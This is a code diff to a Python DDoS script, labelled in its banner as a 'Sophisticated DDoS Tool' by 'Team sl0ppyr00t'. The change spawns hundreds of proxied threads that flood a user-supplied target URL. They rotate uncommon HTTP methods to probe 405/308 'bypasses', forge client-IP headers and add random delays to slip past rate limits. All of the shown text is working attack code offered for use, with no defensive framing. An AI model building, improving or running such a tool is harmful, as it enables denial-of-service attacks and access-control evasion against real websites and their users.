@@ -8227,26 +8227,39 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			]
 			
 
-# Spoofed client IP
-spoofed_ip = '1.3.3.9'
+# HTTP Methods for High-Impact 405 and 308 Bypass
+BYPASS_METHODS = ['OPTIONS', 'HEAD', 'TRACE', 'PATCH', 'DELETE', 'PROPFIND', 'CONNECT', 'MKCOL', 'MOVE', 'COPY']
+
+# Function to check client-side IP detection and use target IP if available
+def get_spoofed_ip(url):
+    try:
+        ip_address = socket.gethostbyname(url.split('//')[-1].split('/')[0])  # Extract IP from URL
+        print(f"[INFO] Target IP: {ip_address}")
+        return ip_address  # Use target IP for spoofing
+    except Exception as e:
+        print(f"[ERROR] Could not resolve target IP: {e}")
+        return '127.0.0.1'  # Default to localhost if failed
 
 class Spammer(threading.Thread):
     def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
         self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
         self.num = number
+        self.spoofed_ip = get_spoofed_ip(url)  # Get spoofed IP (target IP or localhost)
         self.headers = {
-            'User-Agent': random.choice(ua),
-            'Keep-Alive': random.randint(110, 9960),
-            'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            'User-Agent': 'BypassTool',
+            'Keep-Alive': str(random.randint(110, 9960)),
+            'Referer': 'http://example.com',
+            'Accept-Encoding': 'gzip, deflate',
             'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Cache-directive': 'no-cache',
+            'Cache-Control': 'no-cache',
             'Pragma': 'no-cache',
+            'X-Requested-With': 'XMLHttpRequest',
             'Upgrade-Insecure-Requests': '1',
-            'X-Forwarded-For': spoofed_ip,
+            'X-Forwarded-For': self.spoofed_ip,  # Add spoofed IP in headers
+            'Client-IP': self.spoofed_ip,
+            'True-Client-IP': self.spoofed_ip,
+            'X-Real-IP': self.spoofed_ip,
         }
         self.proxy_list = proxy_list
         self.lock = threading.Lock()
@@ -8261,99 +8274,57 @@ class Spammer(threading.Thread):
         proxy_handler = urllib.request.ProxyHandler({'http': proxy})
         opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
-        
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
 
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS Attack in Progress")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL, end="")
+        method = random.choice(BYPASS_METHODS)  # Rotate advanced HTTP methods
+        try:
+            req = requests.request(method, self.url, headers=self.headers, timeout=5, allow_redirects=False)
+            print(f"[{method}] {self.url} | Status: {req.status_code}")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Proxy: {proxy}")
-        sys.stdout.flush()
-        sys.stdout.write("\r")
+            # High-Impact 308 Permanent Redirect Bypass
+            if req.status_code == 308 and 'Location' in req.headers:
+                redirect_url = req.headers['Location']
+                print(f"[308 BYPASS] Found permanent redirect to: {redirect_url}")
+                for bypass_method in BYPASS_METHODS:
+                    print(f"[308 BYPASS] Trying {bypass_method} on: {redirect_url}")
+                    bypass_req = requests.request(bypass_method, redirect_url, headers=self.headers, allow_redirects=False)
+                    print(f"[{bypass_method}] {redirect_url} | Status: {bypass_req.status_code}")
+                    time.sleep(random.uniform(0.1, 0.5))  # Random delay to evade rate limits
+        except Exception as e:
+            print(f"[ERROR] {e} | Proxy: {proxy}")
 
     def run(self):
         self.lock.acquire()
         print(f"Thread #{self.num:4d} | Starting")
         self.lock.release()
-        time.sleep(1)
         while True:
             try:
                 self.request()
             except Exception as e:
                 print(f"Error in thread #{self.num}: {e}")
-        sys.exit(0)
 
 class MainLoop:
-    def __init__(self):
-        if os.name in ("aix", "amigaos", "android", "aros", "atheos", "beos", "blackberry", "bsd", "ce", 
-    "chromiumos", "cp/m", "cygwin", "darwin", "dec", "dragonflybsd", "edos", "ems", 
-    "freebsd", "gnu", "gnu/hurd", "gnu/linux", "haiku", "hp", "hpux", "hurd", "inferno", 
-    "ios", "irix", "java", "linux", "lynxos", "mac", "macintosh", "maemo", "mandriva", 
-    "meego", "minix", "microsoft", "morphos", "ms-dos", "mvs", "netbsd", "nucleus", 
-    "nt", "openbsd", "opensolaris", "os2", "os400", "os9", "osf1", "palmos", "plan9", 
-    "posix", "qnx", "riscos", "rtem", "sco", "sgi", "sinix", "skyos", "solaris", 
-    "sunos", "symbian", "syllable", "tanenbaum", "tizen", "tru64", "ubuntu", "ultrix", 
-    "unix", "unixware", "uwin", "vms", "vxworks", "webos", "win32", "windows", 
-    "windowsce", "windowsmobile", "windowsphone", "wince", "wrlinux", "xenix", "yospos", 
-    "zos"):
-            self.title()
+    def check_url(self, url):
+        if url[:4] == "www.":
+            url = "https://" + url
+        elif url[:4] == "http":
+            pass
+        else:
+            url = "https://" + url
+        return url
 
-    def title(self):
-        sys.stdout.write("                                                                                          \n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
-        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
-        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("\n")
-
-def check_url(url):
-    if url.startswith("www."):
-        url = "https://" + url
-    elif url.startswith("http"):
-        pass
-    else:
-        url = "https://" + url
-    return url
-
-def setup(self):
-    global N
-    N = 0
-    while True:
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "Sophisticated DDoS Tool")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL)
+    def setup(self):
+        global N
+        N = 0
         url = input('> Enter the target URL to DoS: ')
-        url = check_url(url)  # FIXED: Now correctly using the global function
-        try:
-            req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-            response = urllib.request.urlopen(req)
-            break
-        except:
-            print('> Could not open the specified URL.')
+        url = self.check_url(url)
 
-    while True:
-        try:
-            proxy_file = input('> Enter the path to the proxy list: ')
-            with open(proxy_file, 'r') as in_file:
-                proxy_list = [i.strip() for i in in_file.readlines()]
-            break
-        except:
-            print('Error reading the proxy list file.')
+        proxy_file = input('> Enter the path to the proxy list: ')
+        with open(proxy_file, 'r') as in_file:
+            proxy_list = [i.strip() for i in in_file.readlines()]
 
-    while True:
-        try:
-            num_threads = int(input('> Enter the number of threads [600]: ') or '600')
-            break
-        except:
-            print('Invalid input. Please enter a number.')
-
-    for i in range(num_threads):
-        Spammer(url, i + 1, proxy_list).start()
+        num_threads = int(input('> Enter the number of threads [600]: ') or '600')
+        for i in range(num_threads):
+            Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
     b = MainLoop()
